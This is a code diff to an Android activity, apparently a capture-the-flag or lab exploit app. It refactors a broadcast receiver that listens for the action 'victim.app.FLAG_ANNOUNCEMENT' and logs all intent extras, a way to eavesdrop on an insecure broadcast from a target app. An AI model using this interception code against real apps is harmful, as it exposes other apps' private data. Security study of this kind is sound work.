@@ -18,7 +18,7 @@ import java.util.Set;
 
 public class justlisten extends AppCompatActivity {
 
-    private MyBroadcastReceiver receiver;
+    private BroadcastReceiver receiver;
 
     @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
     @Override
@@ -28,7 +28,30 @@ public class justlisten extends AppCompatActivity {
         setContentView(R.layout.activity_justlisten);
 
         // Initialize receiver
-        receiver = new MyBroadcastReceiver();
+        receiver = new BroadcastReceiver () {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if ("victim.app.FLAG_ANNOUNCEMENT".equals(intent.getAction())) {
+                    dumpIntent(intent);
+                }
+            }
+
+            @SuppressLint("RestrictedApi")
+            public void dumpIntent(Intent i){
+
+                Bundle bundle = i.getExtras();
+                if (bundle != null) {
+                    Set<String> keys = bundle.keySet();
+                    Iterator<String> it = keys.iterator();
+                    Log.e("INTENT","Dumping Intent start");
+                    while (it.hasNext()) {
+                        String key = it.next();
+                        Log.e("INTENT","" + key + "=" + bundle.get(key)+"");
+                    }
+                    Log.e("INTENT","Dumping Intent end");
+                }
+            }
+        };
         // Register the receiver with an intent filter
         IntentFilter filter = new IntentFilter("victim.app.FLAG_ANNOUNCEMENT");
         registerReceiver(receiver, filter,RECEIVER_EXPORTED);
@@ -45,29 +68,4 @@ public class justlisten extends AppCompatActivity {
     }
 
 
-}
-
-class MyBroadcastReceiver extends BroadcastReceiver {
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if ("victim.app.FLAG_ANNOUNCEMENT".equals(intent.getAction())) {
-            dumpIntent(intent);
-        }
-    }
-
-    @SuppressLint("RestrictedApi")
-    public static void dumpIntent(Intent i){
-
-        Bundle bundle = i.getExtras();
-        if (bundle != null) {
-            Set<String> keys = bundle.keySet();
-            Iterator<String> it = keys.iterator();
-            Log.e("INTENT","Dumping Intent start");
-            while (it.hasNext()) {
-                String key = it.next();
-                Log.e("INTENT","" + key + "=" + bundle.get(key)+"");
-            }
-            Log.e("INTENT","Dumping Intent end");
-        }
-    }
 }
